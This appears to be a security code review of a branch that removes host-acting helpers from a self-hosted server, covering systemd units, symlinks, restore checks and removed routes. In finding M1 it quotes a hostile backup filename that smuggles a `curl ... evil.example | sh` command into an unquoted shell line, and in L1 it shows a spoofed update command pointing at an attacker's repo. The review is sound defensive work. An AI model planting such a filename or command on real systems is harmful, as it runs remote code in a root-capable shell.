# Security code QA: no-host-actions (40d120e0, 09ce4337, ebcfcbd7)

Review only, 2026-11-04. Scope: the user's decision that the server never acts on its host. Nothing High.

## Verdict on the seven questions

1. **Root and the host: nothing left.** No script, unit, timer, path, sudoers entry or cron is installed (the
   scripts were grepped, and `deploy_scripts::no_host_helper_is_installed_and_both_scripts_remove_them` checks it).
   Nothing in `server/src` spawns a process (`Command::`/`tokio::process` turn up only in tests). Root reads nothing
   in `data/` except `data/watcher_version` in `installed_version()` (Low 2) and the plain-file database copies
   update.sh makes, which were there before. `restore_request` is read only by the unprivileged server
   (`startup.rs:117`). The SSH command writes it as `kidphone` (`sudo -u kidphone tee`), so a planted symlink gets
   no further than the service user's own rights. The Docker image is still distroless nonroot with `cap_drop: [ALL]`,
   and compose mounts no docker.sock.
2. **update.sh's removal is sound.** It runs after `download_release` and before `systemctl stop`
   (`update.sh:260-264`). It disables only the `.path` and the two `.timer` units. Stopping a path unit does not stop
   the service it started (systemd adds only `Before=`), so an old server's "Update now", which runs update.sh
   inside `kid-phone-server-updater.service`, keeps running. The deleted unit stays loaded until it finishes. watcher.sh
   keeps reading the unlinked file through its open fd, and actions.sh was read in full by `source`. The script is
   idempotent (the sandbox test runs it twice). Every `systemctl disable` has `|| true`, and a failed
   `daemon-reload` exits before the stop, with the old version still running. A re-run finishes the job.
   `/opt/kid-phone-server-updater` was root's: `chown -R root:root` and `chmod 700` in the old install.sh, and the
   old update.sh's `mkdir -p` as root. `/opt` is root's, and `rm -rf` never follows links inside the tree, so the
   service user cannot plant anything for it to follow. The version moves before the directory goes
   (`update.sh:239-242`), and the downgrade check runs before both.
3. **`HOST_FILES` (`startup.rs:81-102`) is safe.** `remove_file` unlinks a symlink and never follows it, and a
   directory with the same name only logs a warning. The list does not touch `backups/`, `backup_schedule.conf` or
   `restore_request`, and `the_old_host_files_are_removed_at_start` checks that. `live_mirror.db` was a full copy of
   the database that fed the drive and nothing else, so deleting it is right.
4. **The systemd restore follows the same rules as the container's.** Both go through `apply_restore_request_capped`:
   a `backup-*.zip` name without `/`, `\` or `..`, at most 1 GiB, the SQLite magic, a prerestore copy, and an undo
   if the database won't open. It all runs as the service user on its own files, so a symlinked backup or an
   oversized marker reaches nothing beyond that user's rights. The PWA route still answers 400 on systemd
   (`backups.rs:778`) and writes nothing.
5. **The removed routes are really gone.** Their handlers are deleted from the router (`main.rs`), so they answer
   404 on both listeners; the phone listener never carried admin routes. `docker.rs:520-537` checks the admin
   listener. Auth, CSRF and settings_log are unchanged on what remains. No template, JS or static file still points
   at a removed route. Old `*_triggered` event labels are kept, so old log rows still read. No form was added, so
   no save can jump to the top.
6. **Docs: see Low 3 and Low 4.**
7. **Docker loses nothing.** Backups, the schedule, upload and download, the in-container restore (exit 3 with
   `restart: unless-stopped`) and the release check (`refresh_release`) are all intact. The live mirror and the drive
   only ever ran on systemd.

## Medium

**M1. The restore command pastes the backup's file name into a shell unquoted** (`i18n/en.json:2936` and
`nb.json:2936` `settings.backups.restore_command`, rendered by `backups.rs:378` `restore_command`, shown in
`templates/backups.html`).
`is_safe_backup_filename` (`backups.rs:144`) refuses only `/`, `\` and `..`, so the list shows any name
`backup-*.zip` that sits in `data/backups/`, and the owner copies `echo {file} | sudo -u kidphone tee ...` into a
root-capable SSH shell.

- Scenario A, realistic, by accident: the owner copies a downloaded backup in by hand, as DEPLOY.md:817 says, and it
  is named `backup-20261104-020000 (1).zip`, as browsers name a second download. The command fails with
  `syntax error near unexpected token '('`. Characters such as `*`, `?` or `[` would expand as a glob.
- Scenario B, deliberate: something that can write a file into `data/backups` without running code plants
  `backup-$(curl -s evil.example|sh).zip`. The owner's own shell runs it, and `sudo` credentials are usually cached
  for the `sudo systemctl` that follows. This branch is meant to remove exactly that kind of path, from the service
  user to the owner.

Fix: single-quote the name in the command (`'{file}'`, with every `'` escaped as `'\''`). Better still, show the
command only for names matching `^backup-[0-9A-Za-z._-]+\.zip$` and say otherwise that the file must be renamed
first. Add a test with a hostile name.

## Low

**L1. The update command shown names the repo from `.env`** (`updates.rs:57`, `update_command`;
`settings.updates.update_command`). `SERVER_RELEASE_REPO` lives in `.env`, which install.sh chowns to the service
user (`install.sh:298`). Anyone who can write that file can make Software Updates show
`curl .../attacker/vibb-launcher/main/server/deploy/update.sh && sudo KPS_REPO=attacker/... bash update.sh`. The
script fetched that way is not signature-checked, only the tarball it downloads is. This is no worse than before
(`reinstall_hint` did the same), and a server running hostile code can show any text it likes anyway. But the page
is now the main way to update. Suggest: show the fixed `palchrb/vibb-launcher` command, or add a line under the
command when the repo is not the default.

**L2. Root still reads the service user's `data/watcher_version`** (`update.sh:119`, `install.sh:143`). After this
branch nothing writes that file (install.sh no longer does), and the server deletes it at every start. It is only
the last fallback. A symlink or FIFO swapped in after the `[ -f ]` check can hang root's update.sh before the stop.
A planted `v999.0.0` gets promoted into root's `VERSION_FILE` by `remove_host_helpers` (`update.sh:239-242`), and
from then on every update is refused without `KPS_ALLOW_DOWNGRADE=1`. Either is a DoS at most, and both were
possible before. Suggest dropping the `data/` fallback: an install that has neither root file just skips the
downgrade check.

**L3. "0.67.0" is written into scripts and docs while `Cargo.toml` says 0.66.1.** The places: `update.sh:20,38,210`,
`install.sh:39,344`, `DEPLOY.md:384` ("0.67.0 or later"), and `server/CLAUDE.md:135` and `DEPLOY.md:379,833`
("server 0.66 and older"). These are right only if this ships as `server-v0.67.0` with the bump in the release
commit (the release refuses a tag that differs from Cargo.toml). If it ships as 0.66.2, all of these are wrong.
`updates.rs:22` is only an example in a comment.

**L4. Stale wording.** `install.sh:300` still lists "the live mirror" among data/'s contents.
`docs/notes/server/architecture.md:28` and `status.md:11` still describe the watcher in the present tense. Those
two are history notes and could get a one-line "gone since 0.67" pointer.

**L5. Rolling back below 0.67 leaves dead buttons and a stale version file.** After `KPS_ALLOW_DOWNGRADE=1` or the
manual rollback in DEPLOY.md "Rolling back the server", a 0.66 binary's Update, Reboot, Format and Restore buttons
write `update_requested`, and nothing reads it any more, so they silently do nothing. `VERSION_FILE` also still
says 0.67.0, so update.sh would refuse 0.66.x. That direction is safe, and the old directory had the same
behaviour. A line in "Rolling back" would cover it.

Note, not a finding: on systemd the PWA could restore the same way the container does (exit 3, then
`Restart=on-failure`). The process ending itself is not an action on the host. Making systemd SSH-only is a product
choice, not a security need.

## CI

Server CI run 41818307422: success (server-build, both server-image jobs, the server-ci gate).
